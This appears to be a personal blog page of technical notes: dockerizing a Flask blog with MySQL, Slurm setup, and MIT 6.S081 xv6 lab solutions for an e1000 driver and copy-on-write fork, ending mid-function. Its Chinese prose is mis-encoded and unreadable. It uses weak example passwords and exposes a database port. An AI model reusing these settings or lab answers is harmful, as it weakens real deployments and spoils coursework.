<p>è¿™ä¸ªbluelogè¿è¡Œåœ¨äº‘æœåŠ¡å™¨ä¸Šï¼Œæ˜å¹´è¿™æ—¶å€™å°±å·®ä¸å¤šè¿‡æœŸäº†ï¼Œè¿˜æ²¡æƒ³å¥½åˆ°æ—¶å€™è¿ç§»åˆ°å“ªé‡Œï¼Œå°±æƒ³ç€ç”¨dockeræ‰“åŒ…ä¸€ä¸‹ï¼Œæ–¹ä¾¿ä¹‹åä½¿ç”¨ã€‚åŒæ—¶bluelogåŸæ¥ä½¿ç”¨python2.7 + pipenvæ„ä»¶å¼€å‘ç¯å¢ƒçš„ã€‚å‡†å¤‡å‡çº§åˆ°python3 + pip + dockerçš„ç¯å¢ƒã€‚</p>
<h2 id="å‡†å¤‡å·¥ä½œ"><a class="header" href="#å‡†å¤‡å·¥ä½œ">å‡†å¤‡å·¥ä½œ</a></h2>
<p>ä¸‹è½½dockerï¼Œå‚è€ƒç›¸å…³<a href="https://docs.docker.com/language/python/develop/">æ–‡æ¡£</a>ã€‚åœ¨bluelogçš„æ ¹ç›®å½•ä¸‹åˆ›å»ºDockerfileã€‚</p>
<p>åˆ›å»ºdocker volumeæŒä¹…åŒ–ä¿å­˜mysqlçš„æ•°æ®ï¼Œåˆ›å»ºnetworkç”¨äºä¸¤ä¸ªå®¹å™¨é€šä¿¡</p>
<pre><code class="language-sh">â•°â”€$ docker volume create bluelog_mysql                                      1 â†µ
bluelog_mysql
â•°â”€$ docker volume create bluelog_mysql_config
bluelog_mysql_config
â•°â”€$ docker network create bluelog_mysqlnet
1845be4225056f8994881d90476a8188e7ca44097801901b8fada5dce0f131c5
</code></pre>
<p>å¯åŠ¨mysqlå®¹å™¨ï¼Œåˆ›å»ºæ•°æ®åº“awesome</p>
<pre><code>$ docker run --rm -d -v bluelog_mysql:/var/lib/bluelog_mysql \
-v bluelog_mysql_config:/etc/mysql -p 3306:3306 \
--network bluelog_mysqlnet \
--name mysqldb \
-e MYSQL_ROOT_PASSWORD=dbpass \
mysql

â•°â”€$ docker ps                                                               1 â†µ
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                               NAMES
cf7a578b689e        mysql               &quot;docker-entrypoint.sâ€¦&quot;   23 seconds ago      Up 22 seconds       0.0.0.0:3306-&gt;3306/tcp, 33060/tcp   bluelogdb

$ docker exec -it mysqldb mysql -u root -p                              1 â†µ
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.

mysql&gt; create database awesome default character set utf8mb4 collate utf8mb4_unicode_ci;
Query OK, 1 row affected (0.01 sec)
</code></pre>
<p>æµ‹è¯•ä½¿ç”¨çš„bluelog/.envæ–‡ä»¶éƒ¨åˆ†å†…å®¹ï¼š</p>
<pre><code>FLASK_CONFIG=production
DATABASE_URL=mysql://root:dbpass@mysqldb/awesome?charset=utf8mb4
</code></pre>
<p>Dockerfileå†…å®¹</p>
<pre><code class="language-Dockerfile">FROM python:3.8-slim-buster

WORKDIR /bluelog

COPY requirements.txt requirements.txt

RUN pip3 install -r requirements.txt
RUN pip3 install flask-whooshee
RUN pip3 install pymysql
RUN pip3 install cryptography

COPY . .

CMD [&quot;python3&quot;, &quot;-m&quot; , &quot;flask&quot;, &quot;run&quot;, &quot;--host=0.0.0.0&quot;] # å¼€æ”¾ç»™å¤–éƒ¨å¯è§
</code></pre>
<p>æ ¹æ®Dockerfileæ„ä»¶bluelog-dockeré•œåƒ</p>
<pre><code>$ docker build --tag bluelog-docker .
</code></pre>
<p>å¯åŠ¨bluelog-appå®¹å™¨</p>
<pre><code>$ docker run \                                                                      
--rm -d \   # --rm: Automatically remove the container when it exits. -d: Run container in background and print container ID
--network bluelog_mysqlnet \ # ä½¿ç”¨çš„ç½‘ç»œ
--name bluelog-app \
-p 8000:5000 \ # æœ¬æœºç«¯å£ï¼šå®¹å™¨ç«¯å£
bluelog-docker
</code></pre>
<p>å‘ç°äº†ä¸€äº›bugï¼ŒModuleNotFoundError: No module named 'MySQLdb'ï¼Œ<a href="https://stackoverflow.com/questions/22252397/importerror-no-module-named-mysqldb">å‚ç…§</a>è§£å†³ï¼Œä½¿ç”¨pymysqlä½œä¸ºæ•°æ®åº“æ¥å£</p>
<p>è¿›å…¥bluelog-appå®¹å™¨ä¸­ä½¿ç”¨flaskå‘½ä»¤åˆå§‹åŒ–åšå®¢</p>
<pre><code class="language-sh">$ docker exec -it bluelog-app bash                                                                                                  1 â†µ
root@e7bdaaa29534:/bluelog# ls
Dockerfile  Pipfile       Procfile          README.md   bluelog  migrations        tests    whooshee
LICENSE     Pipfile.lock  Procfile.windows  blogdb.sql  logs     requirements.txt  uploads  wsgi.py
root@e7bdaaa29534:/bluelog# flask init --username admin --password 123
Initializing the database...
Creating the temporary administrator account...
Creating the default category...
Done.
</code></pre>
<p>å³å¯åœ¨localhost:8000ç«¯å£è®¿é—®åšå®¢</p>
<h2 id="ä½¿ç”¨docker-composeè‡ªåŠ¨åŒ–"><a class="header" href="#ä½¿ç”¨docker-composeè‡ªåŠ¨åŒ–">ä½¿ç”¨docker-composeè‡ªåŠ¨åŒ–</a></h2>
<p>åœ¨bluelogç›®å½•ä¸‹åˆ›å»ºdocker-compose.yml</p>
<pre><code class="language-yml">version: &quot;3.7&quot;

services:
  app:
    build:
     context: .  # The app service uses an image thatâ€™s built from the Dockerfile in the current directory. 
    ports:
    - &quot;8000:5000&quot;
    volumes:
    - ./:/bluelog

  mysqldb:  # è¿™ä¸ªåç§°å°±æ˜¯è¦è¢«è¿æ¥çš„hostname
    image: mysql
    ports:
    - 3306:3306
    environment:
    - MYSQL_ROOT_PASSWORD=dbpass
    volumes:
    - bluelog_mysql:/var/lib/mysql
    - bluelog_mysql_config:/etc/mysql

volumes:  # è¿™ä¸¤ä¸ªvolumesæ˜¯ä¹‹å‰ç”¨docker volumeåˆ›å»ºçš„
  bluelog_mysql:
  bluelog_mysql_config:
</code></pre>
<p>å¯åŠ¨</p>
<pre><code>$ docker-compose up
</code></pre>
<p>é‡å¤ä¹‹å‰çš„æ“ä½œï¼Œå¯¹æ¥mysql containerï¼Œåˆ›å»ºæ•°æ®åº“awesome</p>
<pre><code class="language-sql">mysql&gt; create database awesome default character set utf8mb4 collate utf8mb4_unicode_ci;
Query OK, 1 row affected (0.01 sec)
</code></pre>
<p>å¯¹æ¥bluelog-containerï¼Œåˆå§‹åŒ–åšå®¢</p>
<pre><code class="language-sh"># flask init --username admin --password 123
Initializing the database...
Creating the temporary administrator account...
Creating the default category...
Done.
</code></pre>
<p>è®¿é—®localhostï¼š8000
<img src="./images/blog20220422/bluelog.png" alt="bluelog" />
Done!</p>
<h2 id="è¿ç§»æ•°æ®"><a class="header" href="#è¿ç§»æ•°æ®">è¿ç§»æ•°æ®</a></h2>
<p>å°†æœ¬åœ°æ–‡ä»¶å¤åˆ¶åˆ°dockerå®¹å™¨ä¸­</p>
<p>åœ¨mysqlå®¹å™¨ä¸­åˆ›å»ºæ•°æ®åº“blogdbï¼ˆå¯¹åº”è¿™å°æœåŠ¡å™¨ä¸Šçš„ï¼‰ï¼ŒåŒæ—¶æ›´æ”¹.envæ–‡ä»¶çš„URL</p>
<pre><code class="language-sh">sugar@ubuntuServer:~$ mysqldump -u root -p --opt blogdb &gt; blogdb.sql
Enter password: 
# æœ¬æœº
$ scp sugar@118.178.94.244:/path/to/blogdb.sql . 
# å¤åˆ¶åˆ°docker mysql containerä¸­
$ docker cp blogdb.sql bluelog_mysqldb_1:/blogdb.sql
$ docker exec -it bluelog_mysqldb_1 bash
# å¯¼å…¥åˆ°æ•°æ®åº“ä¸­
# æ³¨æ„å¯èƒ½åªèƒ½å•ç‹¬å¯ä¸€ä¸ªmysqlï¼Œä¸å¯åŠ¨bluelog
root@db14eda59ac1:/# mysql -u root -p blogdb &lt; blogdb.sql 

$ docker-compose up
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="mit-6s081-network-driver"><a class="header" href="#mit-6s081-network-driver">MIT 6.S081 Network Driver</a></h1>
<p>é€šè¿‡é˜…è¯»E1000ç½‘å¡é©±åŠ¨çš„æ–‡æ¡£ç†è§£ç½‘ç»œé©±åŠ¨åœ¨æ¥æ”¶å’Œå‘é€æ•°æ®åŒ…æ—¶çš„ä½œç”¨ã€‚ä»¥ä¸‹è®°å½•ã€‚</p>
<p>QEMU emulates the 82540EMï¼Œæ˜¯ä¸€ä¸ªç½‘å¡é©±åŠ¨ï¼Œç»™çš„manualæ˜¯ç½‘å¡çš„è¯´æ˜</p>
<p>E1000æ¨¡æ‹Ÿäº†ä¸€ä¸ªä»¥å¤ªç½‘å¡ xv6ä½œä¸ºä½œä¸ºä¸»æœºï¼Œä½¿ç”¨é©±åŠ¨å‘ç½‘å¡å‘æ•°æ®åŒ…ï¼Œæˆ‘ä»¬è¦å†™ä¸€ä¸ªe1000çš„é©±åŠ¨</p>
<p>å®éªŒä»»åŠ¡å°±æ˜¯æŠŠåŒ…å«äº†ä¸€ä¸ªä»¥å¤ªç½‘å¸§çš„mbufï¼ŒåŒ…è¿›ä¸€ä¸ªe1000çš„å‘é€æè¿°ç¬¦tx_descä¸­ï¼ˆe1000_transmitï¼‰</p>
<p>Receive descriptor ringçš„HEADã€TAILæŒ‡é’ˆå­˜å‚¨åœ¨ç¡¬ä»¶å¯„å­˜å™¨ä¸­ æ¯ä¸ªæ¥æ”¶æè¿°ç¬¦åŒ…å«äº†ä¸€ä¸ªåœ°å€ï¼ŒE1000å¯ä»¥å§æ¥æ”¶åˆ°çš„packageå†™å…¥æ­¤åœ°å€ä¸­</p>
<pre><code class="language-txt">         receive_pkg
Ethernet  ---&gt; E1000 =&gt; xv6
Ethernet  &lt;--- E1000 &lt;= xv6
         transmit_pkg
</code></pre>
<p>e1000_transmit éœ€è¦å°†mbufçš„åœ°å€æ”¾å…¥å‘é€æè¿°ç¬¦ä¸­ã€‚è¦ç¡®ä¿mbufè¢«é‡Šæ”¾ï¼Œç›´åˆ° the E1000 sets the E1000_TXD_STAT_DD bit in the descriptor ç”±äºå°¾æŒ‡é’ˆTDTå¯èƒ½æŒ‡å‘çš„æ˜¯ä¸€ä¸ªå·²ç»å‘é€äº†çš„æè¿°ç¬¦ï¼Œéœ€è¦åœ¨å¢åŠ æ–°çš„æè¿°ç¬¦çš„æ—¶å€™è¿›è¡Œé‡Šæ”¾. return -1è¡¨ç¤ºtransmitå¤±è´¥ï¼Œéœ€è¦è®©calleré‡Šæ”¾mbufã€‚</p>
<pre><code class="language-c">int
e1000_transmit(struct mbuf *m)
{
    //
    // Your code here.
    //
    // the mbuf contains an ethernet frame; program it into
    // the TX descriptor ring so that the e1000 sends it. Stash
    // a pointer so that it can be freed after sending.
    //
    acquire(&amp;e1000_lock);

    uint32 tdt = regs[E1000_TDT];
    if (tdt &lt; 0 || tdt &gt;= TX_RING_SIZE) {
        printf(&quot;E1000_TDT index overflowing\n&quot;);
        release(&amp;e1000_lock);
        return -1;
    }
    if (tx_ring[tdt].status &amp; E1000_TXD_STAT_DD) {
        if (tx_mbufs[tdt] != 0) {
            mbuffree(tx_mbufs[tdt]);  // free the last mbuf
        }
        tx_ring[tdt].addr = (uint64) m-&gt;head;
        tx_ring[tdt].length = m-&gt;len;
        tx_ring[tdt].cmd = E1000_TXD_CMD_EOP | E1000_TXD_CMD_RS; // end of packet , report status(for DD bit)
        tx_mbufs[tdt] = m;   // stash away a pointer for later freeing
        regs[E1000_TDT] = (regs[E1000_TDT] + 1) % TX_RING_SIZE;  // update the tail pointer

        release(&amp;e1000_lock);
        return 0;
    } else {
        printf(&quot;The TXD_STAT_DD is not set, the last descriptor hasn't finished transmitting\n&quot;);
        release(&amp;e1000_lock);
        return -1;
    }
}
</code></pre>
<p>e1000_recv æ‰«ææ¥æ”¶æè¿°ç¬¦ç¯ä¸Šçš„æ¯ä¸ªæè¿°ç¬¦ï¼Œä½¿ç”¨net_rxå‘é€ç»™xv6ã€‚åŒæ—¶åˆ†é…ä¸€ä¸ªæ–°çš„ç©ºæ¥æ”¶æè¿°ç¬¦ï¼ŒæŒ‡å®šä¸‹æ¬¡DMAä¼ é€çš„èµ·ç‚¹ã€‚ must scan the RX ring and deliver each new packet's mbuf to the network stack å½“e1000ä»ä»¥å¤ªç½‘ä¸­æ¥æ”¶åˆ°ä¸€ä¸ªpacketçš„æ—¶å€™ï¼Œit first DMAs the packet to the mbuf pointed to by the next RX (receive) ring descriptor , and then generates an interrupt. åœ¨åˆå§‹åŒ–æ—¶ï¼ŒheadæŒ‡å‘rx_bufsçš„å¤´ï¼ŒtailæŒ‡å‘rx_bufsçš„å°¾éƒ¨ï¼Œæ­¤æ—¶æ²¡æœ‰ä»hardwareä¸­æ¥æ”¶åˆ°ä»»ä½•packetï¼Œå½“head=tailæ—¶ï¼Œè¡¨ç¤ºæ¥æ”¶bufferå·²æ»¡ï¼Œ hardwareä¸å†write to the headï¼Œç›´åˆ°softwareç§»åŠ¨tailæŒ‡é’ˆï¼Œè¯»å–æ¥æ”¶çš„æ•°æ®åŒ…ã€‚</p>
<pre><code class="language-c">static void
e1000_recv(void)
{
    //
    // Your code here.
    //
    // Check for packets that have arrived from the e1000
    // Create and deliver an mbuf for each packet (using net_rx()).
    //
//    acquire(&amp;e1000_lock);

//    uint32 rdh = regs[E1000_RDH];
    uint32 rdt = regs[E1000_RDT];
    uint32 next_waiting_pkg_idx = (rdt + 1) % RX_RING_SIZE;
    while (1) {
        if (rx_ring[next_waiting_pkg_idx].status &amp; E1000_RXD_STAT_DD) {
            rx_mbufs[next_waiting_pkg_idx]-&gt;len = rx_ring[next_waiting_pkg_idx].length;
            net_rx(rx_mbufs[next_waiting_pkg_idx]);

            rx_mbufs[next_waiting_pkg_idx] = mbufalloc(0);
            rx_ring[next_waiting_pkg_idx].status = 0;
            rx_ring[next_waiting_pkg_idx].addr = (uint64)rx_mbufs[next_waiting_pkg_idx]-&gt;head; // Program its data pointer (m-&gt;head) into the descriptor

            regs[E1000_RDT] = (rdt + 1) % RX_RING_SIZE;
            rdt = regs[E1000_RDT];
            next_waiting_pkg_idx = (rdt + 1) % RX_RING_SIZE;
        } else {
            printf(&quot;the new packet is not available\n&quot;);
            break;
        }
    }
//    release(&amp;e1000_lock); // todo: why not required
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="slurmå•æœºéƒ¨ç½²"><a class="header" href="#slurmå•æœºéƒ¨ç½²">Slurmå•æœºéƒ¨ç½²</a></h1>
<p>åˆ†å¸ƒå¼ç³»ç»Ÿçš„ä½œä¸šï¼Œéœ€è¦ä¿®æ”¹slurmæºç¨‹åºã€‚æ­¤åšæ–‡è®°å½•åœ¨ubuntuç¯å¢ƒä¸‹éƒ¨ç½²slurmçš„æ–¹æ³•</p>
<h2 id="å®‰è£…mungeç”¨äºé‰´æƒ"><a class="header" href="#å®‰è£…mungeç”¨äºé‰´æƒ">å®‰è£…mungeç”¨äºé‰´æƒ</a></h2>
<pre><code class="language-sh">$ sudo apt install munge
$ sudo create-munge-key 
The munge key /etc/munge/munge.key already exists
Do you want to overwrite it? (y/N) N
$ sudo ls -l /etc/munge/munge.key
-r-------- 1 munge munge 1024 11æœˆ 30 20:31 /etc/munge/munge.key
$ sudo service munge start
</code></pre>
<p>æºç <a href="https://www.schedmd.com/downloads.php">ä¸‹è½½</a>, ç‰ˆæœ¬:21.08.4</p>
<p>å‚è€ƒ<a href="https://github.com/SchedMD/slurm/blob/master/INSTALL">INSTALL</a></p>
<pre><code class="language-sh">$tar --bzip -x -f slurm-21.08.4.tar.bz2 
$ cd slurm-21.08.4/
$ ./configure --with-hdf5=no  # é˜²æ­¢makeæ—¶ç¼ºå°‘ç›¸å…³åº“æŠ¥é”™
$ make
$ sudo make install
</code></pre>
<p>æ‰“å¼€ file:///home/cstar/project/slurm-21.08.4/doc/html/configurator.easy.htmlï¼ŒæŒ‰ç…§<a href="https://gist.github.com/ckandoth/2acef6310041244a690e4c08d2610423">link</a>å¡«å†™ UserName æ”¹ä¸º slurm(éœ€è¦åœ¨linuxä¸‹æ–°å»ºä¸€ä¸ªslurmç”¨æˆ·)</p>
<pre><code class="language-sh">$ sudo mkdir -p /var/spool/slurm-llnl
$ sudo touch /var/log/slurm_jobacct.log
$ sudo chown root:root /var/spool/slurm-llnl /var/log/slurm_jobacct.log
</code></pre>
<p>å°†submitçš„å†…å®¹å¤åˆ¶åˆ°/usr/local/etc/slurm.confÂ </p>
<p>å¯ä»¥è¯»å–slurm.confäº†ï¼Œä½†æ˜¯æ— æ³•å¯åŠ¨,é€šè¿‡æŸ¥çœ‹<code>cat /var/log/slurmctld.log</code>,å‘ç°ç¼ºå°‘mungeçš„ç›¸å…³åº“</p>
<p>æŒ‰ç…§è¿™ä¸ª<a href="https://github.com/mknoxnv/ubuntu-slurm/issues/3">issue</a>ä¿®æ”¹</p>
<pre><code class="language-sh">$ sudo apt install libmunge-dev libmunge2
~/project/slurm-21.08.4$ make uninstall
$ make distclean
$ ./configure --with-hdf5=no
$ make
$ sudo make install
~/project/slurm-21.08.4$ sudo cp etc/slurmd.service /etc/systemd/system
~/project/slurm-21.08.4$ sudo cp etc/slurmctld.service /etc/systemd/system
$ sudo systemctl daemon-reload 
$ sudo systemctl start slurmctld
$ sudo systemctl start slurmd
$ sinfo
PARTITION AVAIL  TIMELIMIT  NODES  STATE NODELIST
debug*       up   infinite      1   idle cstar-Linux-Server
</code></pre>
<h2 id="slurmä½¿ç”¨"><a class="header" href="#slurmä½¿ç”¨">Slurmä½¿ç”¨</a></h2>
<p><code>$srun -l /path/to/bin/app</code> åœ¨å‰å°è¿è¡Œä¸€ä¸ªjob</p>
<p>ä½¿ç”¨sbatchæäº¤è„šæœ¬ä»»åŠ¡åœ¨åå°æ‰§è¡Œï¼Œè¾“å‡ºç»“æœç”±<code>--output</code>æŒ‡å®š</p>
<p>myjob.sbatch</p>
<pre><code class="language-bash">#!/bin/bash
#SBATCH --job-name=sugarjob
#SBATCH --output=./test.log

pwd; date
./app
</code></pre>
<p>ç”¨<code>sbatch</code>æäº¤è„šæœ¬è¿›è¡Œæ‰§è¡Œï¼Œåœ¨è¿™ä¸ªjobæ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œä¸­é—´ç»“æœæœ‰æ—¶å€™æ˜¯ä¸è¾“å‡ºçš„ï¼Œå¯ä»¥ç”¨<code>squeue</code>æ¥æŸ¥çœ‹ä»»åŠ¡æ‰§è¡Œçš„çŠ¶æ€ã€‚</p>
<pre><code class="language-shell">$ squeue
             JOBID PARTITION     NAME     USER ST       TIME  NODES NODELIST(REASON)
                 8     debug sugarjob    cstar  R       0:03      1 cstar-Linux-Server
</code></pre>
<p>æœ€åå¯ä»¥åœ¨test.logä¸­çœ‹ç¨‹åºçš„è¾“å‡º</p>
<h2 id="ä½¿ç”¨sattachå¯¹æ¥job-stepçš„æ ‡å‡†io"><a class="header" href="#ä½¿ç”¨sattachå¯¹æ¥job-stepçš„æ ‡å‡†io">ä½¿ç”¨sattachå¯¹æ¥job stepçš„æ ‡å‡†io</a></h2>
<p>ç¬¬ä¸€ä¸ªç»ˆç«¯ä½¿ç”¨srunæäº¤ä¸€ä¸ªjob</p>
<pre><code class="language-sh">$ srun app
Hello world
Sleep for 1 seconds
Sleep for 2 seconds
Sleep for 3 seconds
Sleep for 4 seconds
....
</code></pre>
<p>ç¬¬äºŒä¸ªç»ˆç«¯æŸ¥çœ‹æ­¤jobçš„ä¿¡æ¯</p>
<pre><code class="language-sh">$ scontrol
scontrol: show step
StepId=15.0 UserId=1000 StartTime=2021-12-16T18:27:25 TimeLimit=UNLIMITED
   State=RUNNING Partition=debug NodeList=cstar-Linux-Server
   Nodes=1 CPUs=1 Tasks=1 Name=app Network=(null)
   TRES=cpu=1,mem=512M,node=1
   ResvPorts=(null)
   CPUFreqReq=Default Dist=Block
   SrunHost:Pid=cstar-Linux-Server:3291982

scontrol: exit
(base) cstar@cstar-Linux-Server:~$ sattach 15.0
Hello world
Sleep for 1 seconds
Sleep for 2 seconds
Sleep for 3 seconds
...
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="copy-on-write"><a class="header" href="#copy-on-write">Copy On Write</a></h1>
<h2 id="copy-on-write-fork"><a class="header" href="#copy-on-write-fork">Copy On Write Fork</a></h2>
<p>åœ¨forkçš„æ™®é€šå®ç°ä¸­ï¼Œå­è¿›ç¨‹ä¼šå°†çˆ¶è¿›ç¨‹çš„é¡µè¡¨å¤åˆ¶ä¸€ä»½ï¼ˆuvmcopy-&gt;memmoveï¼‰ã€‚COW forkçš„å®ç°åŠ å¿«äº†forkçš„è°ƒç”¨ï¼Œå³åœ¨åˆ›å»ºå­è¿›ç¨‹çš„æ—¶å€™ï¼Œå°†å­è¿›ç¨‹çš„é¡µè¡¨é¡¹éƒ½æŒ‡å‘çˆ¶è¿›ç¨‹ç‰©ç†é¡µçš„ä½ç½®ï¼Œå®ç°å…±äº«ç‰©ç†é¡µï¼ŒåŒæ—¶ç›¸åº”çš„å­è¿›ç¨‹å’Œçˆ¶è¿›ç¨‹é¡µè¡¨é¡¹çš„disable PTE_Wã€set PTE_Cï¼ˆPTE_Cæ˜¯ä¸€ä¸ªæŒ‡ç¤ºä½ï¼Œè¡¨ç¤ºè¯¥é¡µè¡¨é¡¹æŒ‡å‘çš„æ˜¯ä¸€ä¸ªå…±äº«çš„ç‰©ç†é¡µï¼Œåœ¨riscv.hä¸­å¢åŠ å®šä¹‰ï¼‰ï¼Œç›´åˆ°å‘ç”Ÿå¯¹ç›¸åº”è™šæ‹Ÿé¡µçš„å†™çš„æ“ä½œçš„æ—¶å€™ï¼Œå‘ç”Ÿé¡µé”™è¯¯ï¼Œåœ¨trap handlerä¸­åˆ†é…ç‰©ç†é¡µã€‚</p>
<p>ç”±äºå¢åŠ äº†å¯¹åŒä¸€ä¸ªç‰©ç†é¡µçš„å¤šä¸ªå¼•ç”¨ï¼Œæ‰€ä»¥åœ¨é‡Šæ”¾ç‰©ç†é¡µçš„æ—¶å€™è¦è€ƒè™‘è¿˜æœ‰æ²¡æœ‰å…¶ä»–è™šæ‹Ÿé¡µå¼•ç”¨åˆ°è¿™ä¸ªç‰©ç†é¡µã€‚éœ€è¦ç”¨ä¸€ä¸ªå¼•ç”¨è®¡æ•°æ•°ç»„æ¥è®°å½•æ‰€æœ‰ç‰©ç†é¡µçš„è¢«å¼•ç”¨æ¬¡æ•°ï¼Œå½“æœ€åä¸€ä¸ªè™šæ‹Ÿé¡µè¢«é‡Šæ”¾çš„æ—¶å€™ï¼Œæ‰é‡Šæ”¾ç›¸å…³ç‰©ç†é¡µã€‚</p>
<pre><code class="language-c">void
kfree(void *pa)
{
  struct run *r;

    acquire(&amp;kmem.lock);
  if(((uint64)pa % PGSIZE) != 0 || (char*)pa &lt; end || (uint64)pa &gt;= PHYSTOP || kmem.refcount[REFIDX(pa)] &lt;= 0)
    panic(&quot;kfree&quot;);

  if(--kmem.refcount[REFIDX(pa)]) {
      release(&amp;kmem.lock);
      return;
  }

  // Fill with junk to catch dangling refs.
  memset(pa, 1, PGSIZE);

  r = (struct run*)pa;

//  acquire(&amp;kmem.lock);
  r-&gt;next = kmem.freelist;
  kmem.freelist = r;
  release(&amp;kmem.lock);
}
</code></pre>
<p>å†kalloc.cä¸­å®šä¹‰ç‰©ç†é¡µçš„å¼•ç”¨è®°å½•æ•°ç»„ï¼Œä»¥åŠç›¸å…³æ“ä½œ</p>
<pre><code class="language-c">#define REFIDX(pa) ((pa - KERNBASE) / PGSIZE)

struct {
  struct spinlock lock;
  struct run *freelist;
  char refcount[MAXPAGES];
} kmem;


char read_ref(uint64 pa) {
    return kmem.refcount[pa];
}
void acquire_reflock(void) {
    acquire(&amp;kmem.lock);
}
void release_reflock(void) {
    release(&amp;kmem.lock);
}
char modify_ref(uint64 pa, int cnt) {
    return kmem.refcount[pa] += cnt;
}

void *kalloc_nolock(void) {
    struct run *r;

    r = kmem.freelist;
    if (r)
        kmem.freelist = r-&gt;next;
    if (r) {
        memset((char *) r, 2, PGSIZE);
        if (kmem.refcount[REFIDX(r)])
            panic(&quot;kalloc: new page already has reference count.&quot;);
        kmem.refcount[REFIDX(r)] = 1;
    }

    return (void *)r;
}

void *
kalloc(void)
{
  struct run *r;

  acquire(&amp;kmem.lock);
  r = kmem.freelist;
  if(r)
    kmem.freelist = r-&gt;next;

  if(r) {
      memset((char *) r, 5, PGSIZE); // fill with junk
      if(kmem.refcount[REFIDX(r)])
          panic(&quot;kalloc: new page already has refcount!&quot;);
      kmem.refcount[REFIDX(r)] = 1;
  }
    release(&amp;kmem.lock);
  return (void*)r;
}
</code></pre>
<p>åŒæ—¶åœ¨def.hä¸­å£°æ˜è¿™äº›å‡½æ•°ï¼Œæ–¹ä¾¿åœ¨æ“ä½œè™šæ‹Ÿå†…å­˜ï¼ˆvm.cï¼‰ã€é™·é˜±ï¼ˆtrap.cï¼‰æ—¶ä½¿ç”¨ã€‚</p>
<pre><code class="language-c">// reference count management
#define REFIDX(pa) (((uint64)pa - KERNBASE) / PGSIZE)

char read_ref(uint64);
void acquire_reflock(void);
void release_reflock(void);
char modify_ref(uint64, int);
void *kalloc_nolock(void);  // æ— é”å¾—åˆ†é…ä¸€ä¸ªç‰©ç†é¡µï¼Œç”¨äºCOW
</code></pre>
<p>forkä½¿ç”¨çš„æ˜¯uvmcopyæ¥å¤åˆ¶é¡µè¡¨ï¼Œä¿®æ”¹uvmcopyï¼Œä»…å¢åŠ ç›¸åº”ç‰©ç†é¡µçš„å¼•ç”¨è®¡æ•°ã€‚</p>
<pre><code class="language-c">int
uvmcopy(pagetable_t old, pagetable_t new, uint64 sz) {
    pte_t *pte;
    uint64 pa, i;
    uint flags;
//    char *mem;

    for (i = 0; i &lt; sz; i += PGSIZE) {
        if ((pte = walk(old, i, 0)) == 0)
            panic(&quot;uvmcopy: pte should exist&quot;);
        if ((*pte &amp; PTE_V) == 0)
            panic(&quot;uvmcopy: page not present&quot;);
        pa = PTE2PA(*pte);
        flags = PTE_FLAGS(*pte);

//    if((mem = kalloc()) == 0)
//      goto err;
//    memmove(mem, (char*)pa, PGSIZE);
        *pte = (*pte &amp; (~PTE_W)) | PTE_C;  // clear the PTE_W flag of parent page and set the COW flag
        flags &amp;= (~PTE_W);  // clear the PTE_W flag of child page
        if (mappages(new, i, PGSIZE, (uint64) pa, flags | PTE_C) != 0) {  // map the old PTE pa to the new PTE
//            kfree(mem);
            goto err;
        }
        acquire_reflock();
        modify_ref(REFIDX(pa), 1);
        release_reflock();
    }
    return 0;

    err:
    uvmunmap(new, 0, i / PGSIZE, 1);
    return -1;
}
</code></pre>
<p>åœ¨ä¸­æ–­å¤„ç†ç¨‹åºusertrapä¸­å¤„ç†Store Page Faultï¼Œä¿®æ”¹é¡µè¡¨é¡¹ï¼Œæ ¹æ®å¼•ç”¨è®¡æ•°æ¥å†³å®šæ˜¯å¦åˆ†é…ç‰©ç†é¡µã€‚</p>
<pre><code class="language-c">    else if((which_dev = devintr()) != 0){
    // ok
  } else if (r_scause() == 15) {
      // Store/AMO page fault
      const char *reason = 0;
      int faultaddr = r_stval();
      pte_t *pte = walk(p-&gt;pagetable, faultaddr, 0);
      if (pte == 0) {
          reason = &quot;Page does not exist&quot;;
      } else {
          if ((*pte &amp; PTE_V) == 0) {
              reason = &quot;Not a valid pte&quot;;
          } else if ((*pte &amp; PTE_C) == 0) {
              reason = &quot;Not a COW pte&quot;;
          } else if ((*pte &amp; PTE_U) == 0) {
              reason = &quot;Not a user page&quot;;
          } else {
              uint64 pa = PTE2PA(*pte);
              acquire_reflock();
              if (read_ref(REFIDX(pa)) == 1) {
                  *pte = ((*pte | PTE_W) &amp; ~PTE_C);  // set the writable and clear the COW flag
              } else {
                  char *mem = kalloc_nolock();
                  if (mem == 0) {
                      reason = &quot;No enough memory&quot;;
                  } else {
                      memmove(mem, (void *)pa, PGSIZE);
                      int flg = ((PTE_FLAGS(*pte) | PTE_W) &amp; ~PTE_C); // clear
                      *pte = PA2PTE((uint64)mem) | flg;
                      modify_ref(REFIDX(pa), -1);
//                      if (mappages(p-&gt;pagetable, va, PGSIZE, (uint64)mem, flg) != 0) {
//                          reason = &quot;Cannot map the new alloc page&quot;;
//                          kfree(mem);
//                      } else {
//                          modify_ref(REFIDX(pa), -1);
//                      }
                  }
              }
              release_reflock();
          }
      }
      if (reason != 0) {
          printf(&quot;usertrap(): unhandled write page fault (%s). scause %p pid=%d\n&quot;, reason, r_scause(), p-&gt;pid);
          printf(&quot;            sepc=%p stval=%p\n&quot;, r_sepc(), r_stval());
          p-&gt;killed = 1;
      }
</code></pre>
<p>ä¿®æ”¹copyoutï¼Œä»å†…æ ¸ç©ºé—´å†™å…¥åˆ°ç”¨æˆ·ç©ºé—´ï¼Œä¿®æ”¹é¡µè¡¨é¡¹çš„set PTE_Wå’Œunset PTE_Cä½ï¼Œæ ¹æ®å¼•ç”¨è®¡æ•°å†³å®šæ˜¯å¦åˆ†é…ç‰©ç†é¡µã€‚</p>
<pre><code class="language-c">int
copyout(pagetable_t pagetable, uint64 dstva, char *src, uint64 len) {
    uint64 n, va0, pa0;

    while (len &gt; 0) {
        va0 = PGROUNDDOWN(dstva);
        if (va0 &gt; MAXVA)
            return -1;
        pte_t *pte = walk(pagetable, va0, 0);
        if (pte == 0 || (*pte &amp; PTE_U) == 0 || (*pte &amp; PTE_V) == 0 || (uint64)PTE2PA(*pte) == 0) {
            return -1;
        }
        pa0 = (uint64)PTE2PA(*pte);
        if ((*pte &amp; PTE_W) == 0) {
            if (*pte &amp; PTE_C) {
                uint64 pa = (uint64)PTE2PA(*pte);
                acquire_reflock();
